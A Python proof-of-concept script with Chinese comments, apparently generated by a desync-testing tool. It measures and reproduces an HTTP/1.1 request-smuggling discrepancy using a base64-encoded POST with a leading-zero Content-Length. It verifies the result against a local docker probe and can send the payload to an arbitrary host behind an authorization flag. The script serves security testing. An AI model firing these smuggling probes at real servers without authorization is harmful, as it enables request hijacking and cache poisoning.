#!/usr/bin/env python3
"""请求走私（HTTP/1.1 消息边界分歧）

由 CED 自动生成 —— 用例 8b2611d2，场景 desync，领域 http1-framing。
零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。

    python poc_8b2611d2.py                      # 离线：算清量化指标（默认，不联网）
    python poc_8b2611d2.py --chain http://127.0.0.1:8801 [--front HOST:PORT]
                                            # 实机取证：发给真实前置，断言探针实收/消费字节数与模型一致
    python poc_8b2611d2.py --send HOST:PORT --i-am-authorized
                                            # 真的把最小复现样本发出去（仅限已授权目标）

合规：--send 必须同时给出 --i-am-authorized；--chain 与 --send 互斥。
--chain 依赖 docker/ 栈（探针控制口 8801、前置入口 8080）。只对自有或已授权目标使用。
"""
from __future__ import annotations

import argparse
import base64
import socket
import sys
from pathlib import Path


def _find_root() -> Path:
    """往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。"""
    here = Path(__file__).resolve()
    for parent in here.parents:
        if (parent / "ced" / "__init__.py").is_file():
            return parent
    return here.parent


ROOT = _find_root()
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from ced.impls import reference
from ced.orchestrate.chain import chain_evidence

CASE_ID = '8b2611d2'
FRONT = 'ref-cl-first'
BACK = 'ref-lenient-cl'
PAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDMNCg0KYWJj')
EXPECT = (39, 0, 39)

DOMAIN = "http1-framing"


def chain_verify(api_base: str, front_addr: str) -> bool:
    """对真实链路取证：重置探针 → 把样本发给真实前置 → 取回探针视角。

    断言（仅 http1-framing 领域，其余领域只展示真实观测）：
      * 探针实收字节数（raw_len）== 模型预测的前置转发字节数 EXPECT[0]
      * 探针自身消费的字节数（fields.consumed）== 模型预测的后端消费数 EXPECT[1]
    两条都过 → verified: real-chain（模型字节账与真实前置行为一致）。
    """
    import json
    import urllib.error
    import urllib.request

    # 控制口是本机服务：绝不走系统代理（否则会被代理劫持成 502）
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    base = api_base.rstrip("/")
    try:
        opener.open(urllib.request.Request(
            base + "/reset", data=b"", method="POST"), timeout=10).read()
    except (urllib.error.URLError, OSError) as exc:
        print(f"real-chain  连不上探针控制口 {base}：{exc}")
        return False

    host, _, port = front_addr.rpartition(":")
    try:
        with socket.create_connection((host or "127.0.0.1", int(port)),
                                      timeout=10) as sock:
            sock.settimeout(8)
            sock.sendall(PAYLOAD)
            # 注意：**不要**对真实前置半关闭 —— 本机实测 nginx 1.25.5 在请求体
            # 在途时收到客户端 EOF 会取消转发（探针只记录到空连接）。
            # 等它回复即可；探针空闲超时 5s 后会自己回观测 JSON。
            try:
                while sock.recv(65536):
                    pass
            except socket.timeout:
                pass
    except OSError as exc:
        print(f"real-chain  连不上真实前置 {front_addr}：{exc}")
        return False

    try:
        with opener.open(base + "/views", timeout=10) as resp:
            views = json.loads(resp.read().decode("utf-8")).get("views", [])
    except (urllib.error.URLError, OSError) as exc:
        print(f"real-chain  取回视角失败：{exc}")
        return False

    if not views:
        if DOMAIN == "http1-framing" and len(EXPECT) == 3 and EXPECT[0] == 0:
            print("real-chain  前置未转发任何字节"
                  "（模型预测 forwarded=0，一致）→ verified: real-chain")
            return True
        print("real-chain  探针没有记录到视角 —— 前置拒绝了样本或未转发")
        return False

    view = views[-1]
    fields = view.get("fields") or {}
    raw_len = view.get("raw_len")
    consumed = fields.get("consumed")
    print(f"real-chain  前置 {front_addr} 转发 {raw_len} 字节到后端"
          f"（探针视角 #{view.get('id')}）")
    for key in sorted(fields):
        print(f"real-chain    {key} = {fields[key]!r}")

    if DOMAIN != "http1-framing" or len(EXPECT) != 3:
        print("real-chain  本领域暂无字节账断言 —— 以上为真实观测，请与 EXPECT 人工比对")
        return True

    forwarded_model, consumed_model, _smuggled = EXPECT
    ok = True
    if raw_len != forwarded_model:
        print(f"real-chain  MISMATCH：探针实收 {raw_len} 字节"
              f"≠ 模型预测前置转发 {forwarded_model} 字节")
        ok = False
    if consumed is not None and consumed != consumed_model:
        print(f"real-chain  MISMATCH：后端消费 {consumed} 字节"
              f"≠ 模型预测 {consumed_model} 字节")
        ok = False
    if ok:
        smuggled = raw_len - (consumed if consumed is not None else 0)
        print(f"real-chain  verified: real-chain —— 实收/消费均与模型一致，"
              f"『被夹带 {smuggled} 字节』的结论有真实链路支撑")
    return ok



def measure():
    """按两侧的策略算出量化指标。算不出来返回 None。"""
    try:
        front_policy = reference.policy_of(FRONT)
        back_policy = reference.policy_of(BACK)
    except KeyError:
        return None
    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)
    return ev.forwarded, ev.back_consumed, ev.smuggled_len


def main() -> int:
    ap = argparse.ArgumentParser(description="CED 生成的复现脚本")
    ap.add_argument("--send", metavar="HOST:PORT",
                    help="把最小复现样本真的发到这个地址（前置入口）")
    ap.add_argument("--i-am-authorized", action="store_true",
                    help="确认对 --send 的目标已获授权；缺此项则拒绝发送")
    ap.add_argument("--chain", metavar="http://HOST:PORT", default=None,
                    help="探针控制口：实机取证（重放样本，断言探针实收/消费字节数与模型一致）")
    ap.add_argument("--front", metavar="HOST:PORT", default="127.0.0.1:8080",
                    help="真实前置入口（--chain 用；默认 docker 栈第一档 127.0.0.1:8080）")
    args = ap.parse_args()

    print(f"用例        {CASE_ID}")
    print(f"链路        {FRONT} → {BACK}")
    print(f"样本长度    {len(PAYLOAD)} 字节")

    got = measure()
    ok = got is not None
    if got is None:
        print("量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现")
    else:
        forwarded, consumed, smuggled = got
        print(f"前置转发    {forwarded} 字节")
        print(f"后端消费    {consumed} 字节")
        print(f"被夹带      {smuggled} 字节")
        if EXPECT[0] is not None:
            ok = got == tuple(EXPECT)
            print(f"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）")

    chain_ok = None
    if args.chain:
        if args.send:
            print("拒绝：--chain 与 --send 互斥（一次只做一件事）")
            return 2
        chain_ok = chain_verify(args.chain, args.front)

    if args.send:
        if not args.i_am_authorized:
            print("拒绝发送：--send 需要同时给出 --i-am-authorized"
                  "（只对自有或已授权目标使用）。")
            return 2
        host, _, port = args.send.rpartition(":")
        with socket.create_connection((host or "127.0.0.1", int(port)), timeout=10) as sock:
            sock.sendall(PAYLOAD)
            sock.shutdown(socket.SHUT_WR)
            response = b""
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response += chunk
        print(f"已发送      {args.send}，收到 {len(response)} 字节响应")
    return 0 if (ok and chain_ok is not False) else 1


if __name__ == "__main__":
    raise SystemExit(main())
